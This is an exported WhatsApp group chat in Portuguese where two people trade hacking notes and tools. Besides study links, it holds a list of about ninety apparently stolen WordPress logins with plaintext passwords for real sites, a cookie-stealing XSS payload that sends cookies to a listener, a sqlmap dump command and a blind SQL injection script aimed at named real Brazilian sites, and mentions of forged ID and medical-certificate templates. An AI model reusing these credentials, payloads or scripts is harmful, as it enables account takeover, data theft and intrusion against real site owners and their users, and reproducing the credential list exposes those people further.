@@ -1,0 +1,768 @@
+[08/10/2023, 18:46:44] HACKING: ‎As mensagens e as ligações são protegidas com a criptografia de ponta a ponta e ficam somente entre você e os participantes desta conversa. Nem mesmo o WhatsApp pode ler ou ouvi-las.
+[08/10/2023, 18:46:44] HACKING: ‎Você criou o grupo “HACKING”
+[08/10/2023, 18:47:33] yago martins: find / -name user.txt
+[08/10/2023, 19:14:28] yas💕: chmod 777
+[16/10/2023, 11:42:04] yago martins: tmac
+[16/10/2023, 17:03:22] yas💕: explica
+[16/10/2023, 17:04:33] yago martins: mascara de endereço mac 👀
+[16/10/2023, 17:07:43] yas💕: literal muda o mac
+[16/10/2023, 17:07:49] yas💕: fbi nao estava contando com esta
+[16/10/2023, 17:07:51] yas💕: JQHDKABFKA
+[16/10/2023, 17:07:53] yago martins: hahahahahqhahqha
+[16/10/2023, 17:52:25] yas💕: que falso 🤢
+[16/10/2023, 17:56:54] yago martins: eu to doido
+[16/10/2023, 18:03:14] yas💕: por que
+[18/10/2023, 20:41:11] yago martins: exiftool / foca - metadados
+‎[18/10/2023, 20:45:59] yas💕: ‎figurinha omitida
+[19/10/2023, 22:22:24] yago martins: GTFOBins - escalonamento de privilégio
+[19/10/2023, 22:23:32] yago martins: find / -type f -perm -u=s 2>/dev/null (encontrar arquivos com permissao SUID)
+[19/10/2023, 22:26:02] yago martins: sudo find . -exec /bin/sh \; -quit (shell com o find????)
+[19/10/2023, 22:31:46] yago martins: path sudoers
+[24/10/2023, 11:34:35] yago martins: Logins Wordpress by @black0utz_
+
+https://bsaber.com/wp-login.php|Idontknow923|Oofoofoof1234567898
+https://timeforknowledge.com/wp-login.php|herry|Bookanyexpert12@
+https://www.lucapisciottano.com/wp-login.php|wp_11100198|lucapi29
+https://blog.couponmoto.com/wp-login.php|poonam|Poonam@123
+https://kupanaia.live-website.com/wp-login.php|KUPANAIA|PonypiticlI77_
+https://www.seosubmitbookmark.com/wp-login.php|kathiemurphy|Fusion@#123
+http://neoteric-arms.com/wp-login.php|chris0087|danny87!
+https://tupresencia.online/wp-login.php|Jesus_Garcia|iamelti1609
+https://www.saritshoval.co.il/wp-login.php|rkeonig|A5Yk(c&oe4W8DaB9;
+http://homecare.sevennexus.in/wp-login.php|William|NtZi8pIqo5MXVglwx3ac0ykH
+http://svatby.honsig.eu/wp-login.php|admin21|Karlos2122@&
+http://opticor.org/wp-login.php|Cpfaulve|Welcome1
+http://pawtasticpetsolutions.com/wp-login.php|nier|nier123
+https://blogs.buopso.com/wp-login.php|purudhawan|Sai9871155026
+https://wordpressmailchimp.com/wp-login.php|deepfocusweb@gmail.com|$P$BSvWQj7AWwGmS
+http://shypay.ir/wp-login.php|gohari|26314047Mg
+http://connect.consolis.com/wp-login.php|lionel.chenet@consolis.com|!@y%#((LWhxYo4qf
+https://varshamobiles.000webhostapp.com/wp-login.php|Admin|Varsha@12345
+http://goodlifeseduccion.com/wp-login.php|miguel5484|teamo484Z
+https://hrm.org.za/wp-login.php|admin|Zibu@2019
+http://ivycarly.local/wp-login.php|alexie|Ivycarly01
+https://sudhtalk.com/wp-login.php|admin|#12.sudhanshupal
+https://www.gogeekworld.com/wp-login.php|admin|monking56
+http://sevongo.com/wp-login.php|admin|baashe123
+https://ocul.to/wp-login.php|Teopanzolco|7Li&zj3vM;^gIS5kw
+http://www.powerwashmaster.ca/wp-login.php|Tello|CwHjF)EXnBqC`^
+http://hippocampus.co.in/wp-login.php|admin_hippo|hippo@0616405
+http://khoqua.local/wp-login.php|minhkhoi|minhkhoi
+https://www.needrom.com/wp-login.php|UNKNOWN|i1love4you3
+https://ensegway.es/wp-login.php|JuanAntonioTOURISCOIN|#rOKA7B$PU$N1pK@17BZ3i8X
+http://ayurvedasto.local/wp-login.php|jatinsaini|Jatin@saini88500
+http://mgraphics.fr/wp-login.php|admin8054|h3pH53^9i6q%TOy!
+http://www.peoplematter.org.za/wp-login.php|admin|PeopleMatter@Hope2021
+https://www.baiscopelk.com/wp-login.php|Anuda99|Anuda123@
+https://luckyocean.com.mv/wp-login.php|luckyocean|JHF(S*H#$HF(*h4
+https://wordpress.com/wp-login.php|vartika07|TvrTi2707
+https://92hits.com/wp-login.php|Salviano|palmeiras2
+http://moderntalking.ir/wp-login.php|gohari|26314047Mg
+http://twigmedialab.com/wp-login.php|alex|alex123456
+http://www.charmjokes.com/wp-login.php|Pk399@charm|Ramdaspethonjal1979
+https://www.madamepizza.it/wp-login.php|admin|barbara
+https://videogamemods.com/wp-login.php|nvdienst|N07062006!!
+http://langstonsgroup.co.uk/wp-login.php|langstons|kZH8fsadwW@nFeM(Ze
+https://language.gq/wp-login.php|admin|pass
+http://saadcreatix.unaux.com/wp-login.php|SAADCREATIX|03042236199SAAD
+https://grupojuandelgado.es/wp-login.php|admin|mongonmusse
+http://7tube.tk/wp-login.php|7Tube|ys2017tr
+https://warestore.000webhostapp.com/wp-login.php|admin|Hamas@fif13
+https://feedthedream.ca/wp-login.php|vsingh|VoVivZJ@(zb($C7r
+https://rumahwp.com/wp-login.php|wpmania|kAti@dx2!KAiWLv
+http://sachsesamna.com/wp-login.php|shahnawaz|Laal@1992
+http://mgtour.ir/wp-login.php|gohari|26314047
+https://kikof.id/wp-login.php|kikofid|1miliyar
+https://www.bookmarkmaps.com/wp-login.php|kathiemurphy|Fusion@#123
+https://www.otiumtravelperu.com/wp-login.php|Amatista|30072018
+https://blogs.tees.ac.uk/wp-login.php|k0184482|Nepallover91
+https://www.fullstockfirmwaredownload.com/wp-login.php|QuiteXtreme|Just1OfTheseDays
+http://www.mundodigital.press/wp-login.php|RIORICE|AALEJANDRA55
+http://www.dontknowwhattoeat.com/wp-login.php|Vicky|xT)GS#%Ei(By8UdD
+https://www.step-post.fr/wp-login.php|admin8064|Nogamatic64
+https://www.ceftd.org.br/wp-login.php|admin|aq1sw2@@
+https://elliotsfire.co.za/wp-login.php|admin|elliotsfire
+https://dorobilamarketing.com/wp-login.php|dorobilamarketing|N8+dJbLn33cd
+http://grapbox.tk/wp-login.php|admin|arslanch1122
+http://tmoney.biz/wp-login.php|tmadmin|Alleyc@t21
+https://www.vape.gg/wp-login.php|%U$3la^m^QeNj%#m|%U$3la^m^QeNj%#m
+http://tungweb.local/wp-login.php|thanhtung|Minhkhoi@123
+http://p55.f2c.myftpupload.com/wp-login.php|khatoguitar|Breakdance1133!
+http://www.fadesa.es/wp-login.php|admin|mongonmusse
+https://hasbullacoin.in/wp-login.php|spongebobzmrd|Kretenus585
+http://new.polacekvyrobanozu.cz/wp-login.php|admin|Karlos2122@&
+https://sub4sub.net/wp-login.php|policajacpero|leon2007
+https://www.needrom.com/wp-login.php|America Chapiee|5575031239
+http://wikipizza.local/wp-login.php|pizzadmin|pizza
+https://winroseschools.com.ng/wp-login.php|winrose|3B^S^BlI2#gG0p32N&
+http://ejercitateencasamors.lovestoblog.com/wp-login.php|Osvaldo|Bvuz8990
+https://guildwars-2.ru/wp-login.php|BWKQm@EAWBtKV3XG|BWKQm@EAWBtKV3XG
+https://urbanstech.co.in/wp-login.php|admin|Herhitler@1
+http://www.richard-associes-avocats.com/wp-login.php|admin|BQInEoOQ7g@AePGs
+https://accc.es/wp-login.php|positio|Positio2018
+http://localhost/wp-login.php|eisan-admin|Akswlwlak#eisan
+https://myosbytitiosoba.com/wp-login.php|@myos|B6qzIBmMQFUkOq
+https://wzwanmi.com/wp-login.php|admin|Kanyue~1109
+https://www.baiscopelk.com/wp-login.php|Etel112233|ET
+https://perfumerybyjenorah.com/wp-login.php|@jenorah|Jforjenorah2334
+http://www.jamesbill.com/wp-login.php|camp-west|5?BWLI1*Sr/^d!WT]
+https://wickedsingle.com/wp-login.php|Sophie Williams|mind@123
+https://portal.optuma.com/wp-login.php|Sajad_goker|12345qwQW!
+[24/10/2023, 20:19:51] yago martins: morfHTA
+[24/10/2023, 21:18:58] yas💕: --help
+[24/10/2023, 21:19:07] yas💕: ezplica
+[24/10/2023, 21:39:40] yago martins: nao❣️
+[24/10/2023, 21:41:11] yago martins: isso aqui eh um ofuscador de codigo
+[24/10/2023, 21:41:16] yago martins: tenho q ver se existe ainda
+[26/10/2023, 22:10:06] yago martins: estudar fdt
+[26/10/2023, 22:10:08] yago martins: fdp
+[26/10/2023, 22:10:13] yago martins: ftp
+[26/10/2023, 22:15:05] yago martins: epieos.com - osint
+[27/10/2023, 07:21:11] yago martins: FTP brute force - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+[27/10/2023, 07:42:22] yas💕: ai n eh que ta estudandin mesmo
+[27/10/2023, 07:42:33] yago martins: aii toma
+[31/10/2023, 10:28:35] yago martins: CSCU, security +
+‎[31/10/2023, 14:38:45] yago martins: ‎imagem ocultada
+‎[31/10/2023, 14:39:10] yago martins: ‎imagem ocultada
+‎[31/10/2023, 14:39:34] yago martins: ‎imagem ocultada
+‎[31/10/2023, 14:40:05] yago martins: ‎imagem ocultada
+‎[31/10/2023, 14:40:58] yago martins: ‎imagem ocultada
+[01/11/2023, 08:17:05] yago martins: hackergpt
+[07/11/2023, 22:54:39] yago martins: nuclei, acunetix
+[11/11/2023, 15:26:03] yago martins: zzzcode ai
+[11/11/2023, 19:40:38] yago martins: /usr/share/dirbuster/wordlists]
+[11/11/2023, 20:34:41] yas💕: netcat - port connection: send message thru port and watch server response
+   
+   example:
+   nc bancocn.com 80  //command
+   GET / HTTP/1.0  //request
+[11/11/2023, 20:34:49] yas💕: nmap - port scan: find service connections
+
+   example:
+   nmap bancocn.com  //command with domain or ip
+[11/11/2023, 20:34:56] yas💕: -sS -sV -p
+[11/11/2023, 21:19:11] yas💕: echo "hello world" - print
+
+./file - executar
+
+chmod +x file - permissao pra executar
+
+#!/bin/bash - int main
+
+sudo apt-get upgrade -y 
+sudo apt-fet update -y
+sudo apt-get autoremove -y
+[11/11/2023, 21:20:14] yas💕: sudo apt-get upgrade -y > log.txt - joga print no file especificado
+[11/11/2023, 21:20:49] yas💕: sudo apt-get upgrade -y > log.txt | grep "alguma coisa"
+[11/11/2023, 21:21:11] yas💕: /dev/null - lixeira
+[11/11/2023, 21:23:00] yas💕: sudo apt-get upgrade -y >> log.txt | grep "alguma coisa"
+
+>> - append
+[11/11/2023, 21:26:16] yas💕: grep: captura texto
+pipe: concatena
+cut: corta texto
+tr: substitui ou remove caracter
+read: le input
+‎[11/11/2023, 22:20:05] yago martins: ‎imagem ocultada
+‎[12/11/2023, 20:53:33] yago martins: ‎imagem ocultada
+‎[12/11/2023, 20:53:47] yago martins: ‎imagem ocultada
+‎[12/11/2023, 20:54:34] yago martins: ‎imagem ocultada
+‎[12/11/2023, 20:55:16] yago martins: ‎imagem ocultada
+‎[12/11/2023, 20:55:55] yago martins: ‎imagem ocultada
+[20/11/2023, 08:11:05] yago martins: https://danzsouza.medium.com/o-que-%C3%A9-ssti-server-side-template-injection-e-como-explorar-fa4b3d53b648
+[20/11/2023, 19:35:30] yago martins: web goating
+‎[21/11/2023, 07:18:51] yago martins: ‎imagem ocultada
+‎[21/11/2023, 07:18:51] yago martins: ‎imagem ocultada
+‎[21/11/2023, 07:18:52] yago martins: ‎imagem ocultada
+[21/11/2023, 07:21:07] yas💕: https://github.com/epsylon/xsser
+‎[21/11/2023, 07:21:15] yas💕: ‎figurinha omitida
+[21/11/2023, 07:21:25] yago martins: 👀
+[21/11/2023, 07:21:38] yago martins: tell me about
+‎[21/11/2023, 07:22:42] yas💕: ‎imagem ocultada
+‎[21/11/2023, 07:23:01] yas💕: ‎imagem ocultada
+[21/11/2023, 07:23:15] yago martins: imaginei
+[21/11/2023, 07:23:23] yago martins: tem varios desses
+‎[21/11/2023, 07:23:47] yago martins: ‎imagem ocultada
+[21/11/2023, 07:24:04] yago martins: da p usar o burp
+[21/11/2023, 07:24:13] yago martins: pra ver a resposta da requisição
+[21/11/2023, 07:24:26] yago martins: se o site tratar c aspas
+[21/11/2023, 07:24:30] yago martins: 😈😈😈😈😈
+[21/11/2023, 07:24:36] yas💕: vamos
+[21/11/2023, 07:24:37] yas💕: usar
+[21/11/2023, 07:24:55] yas💕: vou baixar aquele script tb
+[21/11/2023, 07:25:06] yago martins: le o script antes
+[21/11/2023, 07:25:12] yago martins: git eh cheio de coisi
+[21/11/2023, 07:52:57] yas💕: simnmnnmnn
+[21/11/2023, 07:53:04] yas💕: vai que vc manipulou esse print
+[21/11/2023, 07:53:10] yas💕: upou um script aleatorio no git
+[21/11/2023, 07:53:13] yas💕: so pra eu baixar
+[21/11/2023, 07:53:18] yas💕: pra hackear meu pc
+[21/11/2023, 12:27:49] yago martins: hackerone, hacktivit, bugcrown, inspectiv, federacy
+[23/11/2023, 00:34:18] Pedrin: ‎Pedrin entrou usando o link de convite deste grupo
+[23/11/2023, 00:34:22] Pedrin: oi
+[23/11/2023, 00:34:32] yago martins: OLÇOCO DEU CERTO
+[23/11/2023, 00:34:59] Pedrin: ‎Você removeu Pedrin
+[23/11/2023, 00:40:31] yago martins: msvenon
+[23/11/2023, 09:55:22] yago martins: assinatura de arquivo, base64, encolders
+[23/11/2023, 12:52:54] yago martins: oxyry - python ofuscator
+[23/11/2023, 12:59:09] yago martins: nuitka
+[23/11/2023, 13:55:53] yas💕: T= menor tempo do ciclo
+f = frequência (quantas vezes roda o clock por segundo)
+
+T = 1/f
+[23/11/2023, 15:14:38] yago martins: ffuf
+[24/11/2023, 10:27:11] yago martins: hacktricks - cheat sheet
+[24/11/2023, 11:51:43] yago martins: acunetix.com/blog/articles/exploiting-sql-injection-exemple/
+[30/11/2023, 00:08:14] yago martins: sudo bash -i
+[30/11/2023, 23:41:25] yago martins: sudo systemctl start tor.service
+[15/12/2023, 10:00:42] yago martins: WSTG
+[15/12/2023, 10:57:11] yago martins: DVWA
+[17/12/2023, 22:29:11] yago martins: XSS MASSIVO COM AIRXSS, FREQ E MEG
+https://youtu.be/TgdQg_EaF20?si=7FnMaZW68EClNBdp
+[17/12/2023, 22:40:25] yago martins: ‎Mensagem apagada
+[18/12/2023, 22:00:43] yago martins: echo site.com | subfinder -silent | httpx -silent | nuclei -severity low,medium,high,critical
+[19/12/2023, 21:46:26] yago martins: https://xss-game.appspot.com/level3/frame#' onerror="alert(9)"
+[19/12/2023, 22:24:14] yas💕: javascript:alert(1)
+[20/12/2023, 20:46:53] yas💕: connect ssh on windows
+
+ssh -p port domain.org
+[20/12/2023, 20:58:24] yas💕: find [path] [options] [expression]
+[20/12/2023, 21:08:03] yas💕: https://mayadevbe.me/posts/overthewire/bandit/overview/
+[20/12/2023, 21:33:01] yas💕: find . -name ".*"
+[20/12/2023, 21:33:23] yas💕: cat ./- (pra arquivos q comecam com -)
+[20/12/2023, 21:58:38] yas💕: find filename*
+[20/12/2023, 22:11:31] yas💕: find . -user -group
+[20/12/2023, 22:30:26] yago martins: https://overthewire.org/wargames/bandit/bandit11.html
+ssh banditx@bandit.labs.overthewire.org -p 2220
+
+-0 NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+
+-1 rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
+
+-2 aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
+
+-3 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+
+-4 lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+
+-5 P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
+
+-6 z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
+
+-7 TESKZC0XvTetK0S9xNwm25STk5iWrBvP
+
+-8 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
+
+-9 G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
+
+-10 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM ‎<Mensagem editada>
+[27/12/2023, 00:24:30] yago martins: /home/kali/.local/share/sqlmap/output/
+[12/01/2024, 23:55:06] yago martins: ssh banditx@bandit.labs.overthewire.org -p 2220
+
+-0 NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+
+-1 rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
+
+-2 aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
+
+-3 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+
+-4 lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+
+-5 P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
+
+-6 z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
+
+-7 TESKZC0XvTetK0S9xNwm25STk5iWrBvP
+
+-8 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
+
+-9 G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
+
+-10 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
+
+-11 JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
+
+-12 wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
+
+-13 fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
+[23/01/2024, 23:34:49] yago martins: https://www.taskade.com/d/HP9TB1HJsYrDJQpU
+[26/01/2024, 16:19:56] yago martins: describing.\ + similaryNow write oppositeley.](Me giving**ONE please? revert with “\!—Two
+[28/01/2024, 01:12:42] yago martins: sqlmap -r cookie.txt (http request do site) -D minascac_banco (-D = Database) -T produtos (-T = Table) -C mais_vendidos (-C = Coulumn) --dump (--dump = extrair dados)
+[29/01/2024, 10:32:08] yago martins: portswigger.net/web-security/all-labs#sql-injection
+‎[09/02/2024, 17:53:08] yago martins: Ethical-Hacking.pdf • ‎255 páginas ‎documento omitido
+[09/02/2024, 17:53:34] yas💕: ethical(??????)
+‎[09/02/2024, 17:53:42] yago martins: Basics_of_Penetration_Testing.pdf • ‎178 páginas ‎documento omitido
+‎[09/02/2024, 17:54:09] yago martins: BUG_BOUNTY_HUNTING_ESSENTIALS.pdf • ‎261 páginas ‎documento omitido
+‎[09/02/2024, 17:54:36] yago martins: Python_Playground_Geeky_Projects_for_the_Curious_Programmer.pdf • ‎353 páginas ‎documento omitido
+‎[09/02/2024, 17:55:48] yago martins: As 48 Leis Do Poder.pdf • ‎111 páginas ‎documento omitido
+‎[09/02/2024, 17:56:00] yago martins: Manual de Persuasão do FBI.pdf • ‎274 páginas ‎documento omitido
+‎[09/02/2024, 17:56:13] yago martins: As Armas da Persuasão.pdf • ‎331 páginas ‎documento omitido
+‎[09/02/2024, 17:56:36] yago martins: A Ciência da Persuasão.pdf • ‎8 páginas ‎documento omitido
+‎[09/02/2024, 18:04:48] yago martins: ATESTADOS - EDITAVEL.rar ‎documento omitido
+‎[09/02/2024, 18:05:27] yago martins: CNH COM M. AGUA .cdr ‎documento omitido
+[09/02/2024, 18:07:00] yas💕: mano
+[09/02/2024, 18:07:06] yas💕: ru nao te conheco
+[09/02/2024, 18:07:07] yas💕: ok
+[09/02/2024, 18:07:09] yas💕: se perguntarem
+[09/02/2024, 18:07:12] yago martins: KKKKKKKKKKKKKKKK
+[09/02/2024, 18:07:37] yago martins: em caso de investigação policial, declwro que nao tenho envolvimento nenhum neste caso, e que sou desprovido de qualquer informação sobre a situação atual, declaro que fui induzido a falar certas palavras por atos libidinosos através do fetiche/fantasias da parceira. por tanto, nao é de comum caso que seja aberto um inquérito de busca e apreensão
+[09/02/2024, 18:09:16] yas💕: Declaro que me envolvi em atos criminosos sob influência e manipulação do meu parceiro, que explorou meus fetiches e vulnerabilidades para me convencer a participar dessas atividades ilícitas. Reconheço a gravidade dos meus atos e estou disposta a colaborar plenamente com as autoridades para esclarecer o ocorrido e assumir a responsabilidade pelos meus atos.
+‎[09/02/2024, 18:10:24] yago martins: RG DE SAO PAULO NOVA..cdr ‎documento omitido
+‎[09/02/2024, 18:11:18] yago martins: Resumo da Aula sobre Deep Web.pdf • ‎5 páginas ‎documento omitido
+‎[09/02/2024, 18:12:47] yago martins: Aprovação com InfoCC.pdf • ‎21 páginas ‎documento omitido
+‎[09/02/2024, 18:15:29] yago martins: Método de Como Achar Documentos no Google.pdf • ‎5 páginas ‎documento omitido
+‎[09/02/2024, 18:16:39] yago martins: 10 Mil Dorks para SQL Injection.txt ‎documento omitido
+‎[09/02/2024, 18:18:16] yago martins: Google Hacking for Pentesters.pdf • ‎170 páginas ‎documento omitido
+‎[09/02/2024, 18:18:48] yago martins: Black_Hat_Python_Programacao_Python_para.pdf • ‎114 páginas ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Cavalo de Tróia.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Ataque MITM.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Formato de Ataque Sequencial.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Injeção de SQL.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Travessia de Caminho Relativo.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Consumo De Recursos Assimetricos.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Injeção de Comando.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades_Hacking_Ataque_de_Injeção_De_Comentário.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Fixação de Sessão.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Cross-Frame Scripting Ataque.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades_Hacking_Injeção_Direta_de_Código_Estático.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Injeção XPATH.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades_Hacking_Código_Móvel_Campo_Público_Não_Final.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Manipulação de Caminho.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Negação de Serviço (DoS).txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades_Hacking_Estouro_de_Recursos_de_Arquivos_Binários.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Inundação de Tráfico.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Plantação de Binários.txt ‎documento omitido
+[09/02/2024, 18:17:17] yas💕: 10 MIL UNIDADES
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Divisão de Resposta HTTP.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Rastreamento Cross-Site.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Previsão de Sessão.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Injeção de Recurso.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Navegação Forçada.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Injeção SQL Cega.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Criptoanálise.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Ataque de Repúdio.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Ataque Força Bruta.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Delimitador de Parâmetro.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Codificação Dupla.txt ‎documento omitido
+‎[09/02/2024, 18:20:43] yago martins: Vulnerabilidades Hacking - Injeção de Elemento Especial.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Ataque de Conta Lock Out.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades_Hacking_Injeção_de_Cáractere_Especial_Personalizado.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades_Hacking_Página_de_Sequestro_Page_Hijacking.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades_Hacking_Pós_execução_de_redireccionamento_EAR.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades_Hacking_Ataque_de_Sessão_Sequestrada_HIJACKING.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Falsificação de Conteudo.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Contrabando de Requisição HTTP.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Injeção Eval ().txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Codificação Unicode.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Desfiguração Cross Usuário.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Injeção de Entrada.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades_Hacking_Injeção_Operacional_Sistemática.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Botnet Knock.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Cross-Site Scripting XSS (XSS).txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades_Hacking_Código_Móvel_Invocando_Código_Móvel_Não.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Ataque MITB.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Injeção Server-Side Includes.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Ataque Estouro de Buffer.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades_Hacking_Falsificação_de_Pedido_Cross_Site_CSFR.txt ‎documento omitido
+‎[09/02/2024, 18:21:48] yago martins: Vulnerabilidades Hacking - Divulgação Completa de Caminho.txt ‎documento omitido
+[13/02/2024, 20:10:05] yago martins: https://books.google.com.br/books?id=cvssDwAAQBAJ&pg=PA93&lpg=PA93&dq=inurl:+?id%3D&source=bl&ots=_aHO7pYgV3&sig=ACfU3U3nAXYcwoLH1LQzPMZ1KiwNy98U5g&hl=pt-BR&sa=X&ved=2ahUKEwi8_oLIt6mEAxXcpZUCHciXD7A4RhDoAXoECAMQAw#v=onepage&q=inurl%3A%20%3Fid%3D&f=false
+[13/02/2024, 23:50:40] yago martins: criar ferramenta para automatizar BH
+[13/02/2024, 23:53:08] yago martins: bugbounty checklist
+[14/02/2024, 11:47:53] yago martins: https://www.hacksplaining.com/features
+[14/02/2024, 16:26:25] yago martins: www.shopaqui.com.br
+[14/02/2024, 16:44:02] yago martins: www.chairetable.com.br
+possivel xxe
+[14/02/2024, 16:49:40] yago martins: www.projetest.com.br
+xss
+[16/02/2024, 21:08:38] yago martins: alert(document.cookie);
+var i=new Image;
+i.src="http://192.168.0.18:8888/?"+document.cookie;
+[16/02/2024, 21:20:22] yago martins: https://www.escolasproconhecer.com.br/site2/busca/busca.php?str_busca=%3Cscript%3Ealert(document.cookie);%3C%2Fscript%3E&Submit.x=86&Submit.y=-1
+[18/02/2024, 22:37:06] yago martins: intelx
+[20/02/2024, 12:16:59] yago martins: https://youtu.be/3mSMFU1tQqY?si=wVJZ2_TfuoNeal8T
+‎[20/02/2024, 16:43:15] yago martins: ‎imagem ocultada
+[27/02/2024, 14:36:24] yago martins: studufetch.com
+[03/03/2024, 19:19:06] yago martins: subfinder -d getmoneytree.com |  waybackurls | uro | grep -E 'q=|s=|search=|lang=|keyword=|query=|page=|keywords=|year=|view=|email=|type=|name=|p=|callback=|jsonp=|api_key=|api=|password=|email=|emailto=|token=|username=|csrf_token=|unsubscribe_token=|id=|item=|page_id=|month=|immagine=|list_type=|url=|terms=|categoryid=|key=|l=|begindate=|enddate=' | dalfox pipe --skip-bav grep "POC" >> poc.txt
+[10/03/2024, 23:12:57] yago martins: #!/bin/bash
+
+letras=('A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z')
+
+# Inicializa a lista vazia
+letras_superior_5=()
+
+for letra in "${letras[@]}"
+do
+    # Obtemos o tempo antes da execução
+    start_time=$(date +%s.%N)
+
+    # Execute o comando com lynx
+    lynx -head -dump "http://minasca.com.br/single-produtos.php?id=27%27%20and%20IF(SUBSTRING(database(),%201,%201)%20=%20%22${letra}%22,%20SLEEP(7),%20NULL)%20--%20%27" >/dev/null
+
+    # Obtemos o tempo depois da execução
+    end_time=$(date +%s.%N)
+
+    # Calculamos o tempo decorrido em segundos
+    elapsed_time=$(echo "$end_time - $start_time" | bc)
+
+    echo "Letra: $letra, Tempo de execução: $elapsed_time"
+
+    if [ "$(echo "$elapsed_time > 5" | bc)" -eq 1 ]; then
+        echo "Sua letra é: $letra"
+        # Adiciona a letra à lista
+        letras_superior_5+=("$letra")
+    fi
+done
+
